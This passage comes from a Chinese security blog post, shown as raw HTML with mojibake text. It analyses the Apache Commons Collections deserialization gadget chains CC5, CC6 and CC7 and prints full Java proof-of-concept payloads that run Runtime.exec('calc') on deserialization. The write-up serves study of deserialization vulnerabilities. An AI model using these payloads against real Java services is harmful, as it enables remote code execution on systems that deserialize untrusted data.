class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>), <span class="keyword">null</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æµ‹è¯•</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(pq);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151155113.png" alt="image-20220215115513899"></p>
<p>ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>
<h3 id="CC5"><a href="#CC5" class="headerlink" title="- CC5 -"></a>- CC5 -</h3><p>å®éªŒç¯å¢ƒï¼š</p>
<ul>
<li><code>jdk1.8.0_20</code></li>
<li><code>Commons Collections 3.2.0</code></li>
</ul>
<h4 id="è°ƒç”¨ç»“æ„-4"><a href="#è°ƒç”¨ç»“æ„-4" class="headerlink" title="- è°ƒç”¨ç»“æ„ -"></a>- è°ƒç”¨ç»“æ„ -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	TiedMapEntry.toString()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	LazyMap.get()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	ChainedTransformer.transform()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	ConstantTransformer.transform() =&gt; Runtime.<span class="keyword">class</span> </span><br><span class="line">    ğŸ‘‡</span><br><span class="line">    InvokerTransformer.transform() =&gt; Runtime.getRuntime</span><br><span class="line">    ğŸ‘‡</span><br><span class="line">    InvokerTransformer.transform() =&gt; Runtime.getRuntime()</span><br><span class="line">    ğŸ‘‡</span><br><span class="line">    InvokerTransformer.tarnsform() =&gt; Runtime.getRuntime().<span class="built_in">exec</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h4><p>è¿™ä¸ªåœ¨ <code>CCé“¾</code> ä¸­åº”è¯¥æ˜¯æ¯”è¾ƒçŸ­çš„é“¾äº†ï¼ŒååŠæ®µå’Œ <code>CC1</code> é“¾å·®ä¸å¤šï¼Œå°±æ˜¯å‰åŠæ®µå¯¹ <code>[(Map)å¯æ§].get</code> çš„è°ƒç”¨è¿‡ç¨‹ä¸åŒç½¢ã€‚</p>
<p>å…ˆæ¥çœ‹ <code>BadAttributeValueExpException</code> ç±»ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151204850.png" alt="image-20220215120411712"></p>
<p>é¦–å…ˆ <code>BadAttributeValueExpException</code> ç±»å±äº <code>Exception</code> å­ç±»ï¼Œè€Œ <code>Exception</code> ç±»æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼Œè¿›è€Œ <code>BadAttributeValueExpException</code> ä¹Ÿæ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼›å†çœ‹ <code>readObject</code> æ–¹æ³•ï¼Œå€˜è‹¥ <code>System.getSecurityManager() == null</code> æˆç«‹å°±ä¼šæ‰§è¡Œ <code>val = valObj.toString()</code> ï¼Œå…¶ä¸­ <code>valObj</code> å˜é‡æ¥è‡ª <code>val</code> å±æ€§åºåˆ—åŒ–çš„å€¼ï¼Œä¹Ÿå°±æ˜¯å¯æ§ä¸”å¯åºåˆ—åŒ–çš„ã€‚</p>
<p>é‚£ä¹ˆè·Ÿè¿› <code>System.getSecurityManager()</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151207142.png" alt="image-20220215120745086"></p>
<p>å¯è§é»˜è®¤çš„è¿”å›å€¼ä¸º <code>null</code> ï¼Œä¹Ÿå°±ä¼šå¾€ä¸‹æ‰§è¡Œ <code>val = valObj.toString()</code> äº†ã€‚åªæ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ä¸èƒ½å¤Ÿç›´æ¥é€šè¿‡æ„é€ æ–¹æ³•æ¥æ§åˆ¶ <code>val</code> å±æ€§çš„å€¼ï¼Œå¾—ç”¨åå°„ï¼Œå¦åˆ™å°±ä¼šæå‰æ‰§è¡Œ <code>val = valObj.toString()</code> ã€‚</p>
<p>ç”±äº <code>val</code> å±æ€§ç±»å‹ä¸º <code>Object</code> ï¼Œç°åœ¨å°±æ‹¥æœ‰äº† <code>[å¯æ§].toString()</code> çš„ç»“æ„äº†ã€‚</p>
<p>è·Ÿè¿› <code>TiedMapEntry</code> ç±»ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151213550.png" alt="image-20220215121356428"></p>
<p>å…ˆæ¥çœ‹ <code>TiedMapEntry</code> ç±»çš„ <code>toString</code> æ–¹æ³•ï¼Œå­˜åœ¨å¯¹ <code>getValue</code> æ–¹æ³•çš„è°ƒç”¨ï¼Œè€Œ <code>getValue</code> æ–¹æ³•ä¸­åˆæœ‰ <code>return this.map.get(this.key)</code> è¯­å¥ï¼›å…¶ä¸­ <code>this.map</code> å±æ€§ç±»å‹ä¸º <code>Map</code> ä¸”å¯æ§å¯åºåˆ—åŒ–ï¼Œå‡è‹¥å°† <code>this.map</code> å±æ€§çš„å€¼è®¾ä¸º <code>LazyMap</code> ç±»ï¼Œè¿›è€Œå°±å¯ä»¥ç”¨æœ‰å…³ <code>Transformer</code> çš„è°ƒç”¨ <code>payload</code> äº†ã€‚</p>
<p>å¹¶ä¸” <code>TiedMapEntry</code>  ç±»çš„ <code>this.map</code> å±æ€§å¯ä»¥ç”±æ„é€ æ–¹æ³•ç›´æ¥èµ‹å€¼ï¼Œè¿˜æ˜¯æ¯”è¾ƒæ–¹ä¾¿çš„ã€‚</p>
<h4 id="payload-6"><a href="#payload-6" class="headerlink" title="- payload -"></a>- payload -</h4><p>åœ¨æ„é€  <code>payload</code> æ—¶åªéœ€è¦æ³¨æ„ <code>BadAttributeValueExpException</code> ç±»çš„ <code>val</code> å±æ€§å¿…é¡»ç”±åå°„æ„é€ ï¼Œå‰©ä¸‹çš„æŒ‰ç…§åˆ†æè¿›è¡Œæ‹¼æ¥å°±å¥½äº†ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test5</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”Ÿæˆæœ‰å…³Transformerçš„payload</span></span><br><span class="line">        Map map = LazyMap.decorate(<span class="keyword">new</span> HashMap(), getTransformerChain(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ TiedMapEntry</span></span><br><span class="line">        TiedMapEntry tm = <span class="keyword">new</span> TiedMapEntry(map,Runtime.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ BadAttributeValueExpException</span></span><br><span class="line">        BadAttributeValueExpException bave = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bave,<span class="string">&quot;val&quot;</span>,tm);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æµ‹è¯•</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(bave);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151228583.png" alt="image-20220215122820368"></p>
<p>æ˜¯æˆåŠŸäº†ã€‚</p>
<h3 id="CC6"><a href="#CC6" class="headerlink" title="- CC6 -"></a>- CC6 -</h3><p>å®éªŒç¯å¢ƒï¼š</p>
<ul>
<li><code>jdk1.7.0_02</code></li>
<li><code>Commons Collections 3.2.0</code></li>
</ul>
<h4 id="è°ƒç”¨ç»“æ„-5"><a href="#è°ƒç”¨ç»“æ„-5" class="headerlink" title="- è°ƒç”¨ç»“æ„ -"></a>- è°ƒç”¨ç»“æ„ -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HashSet.readObject()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	HashMap.put()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	HashMap.<span class="built_in">hash</span>()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">    	TiedMapEntry.hashCode()</span><br><span class="line">        ğŸ‘‡</span><br><span class="line">        TiedMapEntry.getValue()</span><br><span class="line">        ğŸ‘‡</span><br><span class="line">        LazyMap.get()</span><br><span class="line">        ğŸ‘‡</span><br><span class="line">		ChainedTransformer.transform()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		ConstantTransformer.transform() =&gt; Runtime.<span class="keyword">class</span> </span><br><span class="line">    	ğŸ‘‡</span><br><span class="line">    	InvokerTransformer.transform() =&gt; Runtime.getRuntime</span><br><span class="line">    	ğŸ‘‡</span><br><span class="line">    	InvokerTransformer.transform() =&gt; Runtime.getRuntime()</span><br><span class="line">    	ğŸ‘‡</span><br><span class="line">    	InvokerTransformer.tarnsform() =&gt; Runtime.getRuntime().<span class="built_in">exec</span>()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<h4 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h4><p>è¿™ä¸ªä¹Ÿæ˜¯æ”¹äº†å‰åŠæ®µï¼Œåé¢çš„è¿˜æ˜¯æ—§ä¸œè¥¿äº†ï¼Œå…ˆæ¥çœ‹ <code>HashSet</code> ç±»çš„ <code>readObject</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151244841.png" alt="image-20220215124417717"></p>
<p>è¿™ä¸ª <code>HashSet</code> ç±»æ˜¾ç„¶æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåœ¨å…¶ <code>readObject</code> ä¼šä¾æ¬¡è¯»å–æ‰€å­˜å…¥çš„ <code>map</code> å±æ€§çš„å†…å®¹ï¼Œç„¶åå»è°ƒç”¨ <code>map.put</code> ï¼Œå…¶ä¸­é”®åçš„å€¼æ¥è‡ª <code>map</code> å±æ€§ã€‚</p>
<p>å†çœ‹ <code>writeObject</code> æ–¹æ³•ï¼Œå…¶å®å°±æ˜¯å°† <code>map</code> å±æ€§å†™å…¥åºåˆ—åŒ–å†…å®¹ä¸­ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151247444.png" alt="image-20220215124746370"></p>
<p>è¿™ä¸ª <code>map</code> å±æ€§ä¹Ÿå°±å¯ä»¥çœ‹ä½œæ˜¯å¯æ§ä¸”å¯åºåˆ—åŒ–çš„äº†ï¼Œé‚£ä¹ˆç»§ç»­è·Ÿè¿› <code>map.put</code> çš„è°ƒç”¨ï¼Œå…¶å®ä¹Ÿå°±æ˜¯ <code>HashMap</code> ç±»çš„ <code>put</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151251209.png" alt="image-20220215125150124"></p>
<p>ç”±äºé”®åçš„å€¼æ˜¯å¯æ§çš„ï¼Œ<code>hash(key.hashCode())</code> å°±ç›¸å½“äº <code>[å¯æ§].hashCode()</code> çš„ç»“æ„ã€‚</p>
<p>è·Ÿè¿› <code>TiedMapEntry</code> ç±»çš„ <code>hashCode</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151255338.png" alt="image-20220215125535292"></p>
<p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†è‡ªèº«çš„ <code>getValue</code> æ–¹æ³•ï¼Œè·Ÿè¿› <code>getValue</code> æ–¹æ³•å°±æ˜¯å›åˆ°äº† <code>CC5</code> é“¾çš„ä¸­æ®µäº†ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151256405.png" alt="image-20220215125630362"></p>
<p>å…¶å®ä¸»è¦æ¥è¯´ä¹Ÿå°±æ˜¯è°ƒç”¨åˆ° <code>TiedMapEntry</code> ç±»çš„ <code>getValue</code> æ–¹æ³•å‰åŠæ®µè¿‡ç¨‹ç›¸è¾ƒäº <code>CC5</code> é“¾ä¸åŒç½¢äº†ã€‚</p>
<h4 id="payload-7"><a href="#payload-7" class="headerlink" title="- payload -"></a>- payload -</h4><p>ç®€å•æ¥è¯´ç¨å¾®çš„æ›¿æ¢ä¸€ä¸‹ <code>CC5</code> é“¾çš„å‰åŠæ®µå°±å¯ä»¥äº†ï¼Œå½“ç„¶ç”±äº <code>HashSet</code> ç±»åšçš„æ˜¯æˆå…¨ <code>[å¯æ§].hashCode()</code> çš„ç»“æ„ï¼Œå…¶ä»–çš„ç±»å¦‚æœèƒ½æ»¡è¶³ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¯”å¦‚ <code>Hashtable</code> ç±»ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”Ÿæˆæœ‰å…³Transformerçš„payload</span></span><br><span class="line">        Map map = LazyMap.decorate(<span class="keyword">new</span> HashMap(), getTransformerChain(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ TiedMapEntry</span></span><br><span class="line">        TiedMapEntry tm = <span class="keyword">new</span> TiedMapEntry(map,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ Hashtable</span></span><br><span class="line">        Hashtable ht = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        ht.put(tm,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åœ¨putå®Œæ¯•åå†é€šè¿‡åå°„èµ‹å€¼ä»¥å…æœ¬åœ°æ‰§è¡Œ</span></span><br><span class="line">        setFieldValue(tm,<span class="string">&quot;key&quot;</span>,Runtime.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æµ‹è¯•</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(ht);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151330230.png" alt="image-20220215133043038"></p>
<p>æ˜¯æˆåŠŸäº†ã€‚</p>
<h3 id="CC7"><a href="#CC7" class="headerlink" title="- CC7 -"></a>- CC7 -</h3><p>å®éªŒç¯å¢ƒï¼š</p>
<ul>
<li><code>jdk1.8.0_20</code></li>
<li><code>Commons Collections 3.2.0</code></li>
</ul>
<h4 id="è°ƒç”¨ç»“æ„-6"><a href="#è°ƒç”¨ç»“æ„-6" class="headerlink" title="- è°ƒç”¨ç»“æ„ -"></a>- è°ƒç”¨ç»“æ„ -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Hashtable.readObject()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	Hashtable.reconstitutionPut()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	AbstractMapDecorator.equals()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">    	AbstractMap.equals()</span><br><span class="line">        	ğŸ‘‡</span><br><span class="line">        	LazyMap.get()</span><br><span class="line">        	ğŸ‘‡</span><br><span class="line">			ChainedTransformer.transform()</span><br><span class="line">			ğŸ‘‡</span><br><span class="line">			ConstantTransformer.transform() =&gt; Runtime.<span class="keyword">class</span> </span><br><span class="line">    		ğŸ‘‡</span><br><span class="line">    		InvokerTransformer.transform() =&gt; Runtime.getRuntime</span><br><span class="line">    		ğŸ‘‡</span><br><span class="line">    		InvokerTransformer.transform() =&gt; Runtime.getRuntime()</span><br><span class="line">    		ğŸ‘‡</span><br><span class="line">            InvokerTransformer.tarnsform() =&gt; Runtime.getRuntime().<span class="built_in">exec</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h4><p>è¿™ä¸ªé“¾ä»ç„¶æ˜¯æ”¹äº†å‰åŠæ®µï¼Œå…ˆæ¥çœ‹ <code>Hashtable</code> ç±»çš„ <code>readObject</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151405427.png" alt="image-20220215140542306"></p>
<p>è¿™é‡Œæ˜¯ä¾æ¬¡å°†åºåˆ—åŒ–è¿›å»çš„å†…å®¹å–å‡ºï¼Œå¹¶å°†å…¶ä½œä¸º <code>key</code> å’Œ <code>value</code> å‚æ•°å»è°ƒç”¨ <code>reconstitutionPut</code> æ–¹æ³•ï¼Œæ˜¾ç„¶è¿™äº›åºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”± <code>writeObject</code> æ–¹æ³•å†™å…¥åºåˆ—åŒ–ä¸­çš„ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151407887.png" alt="image-20220215140730778"></p>
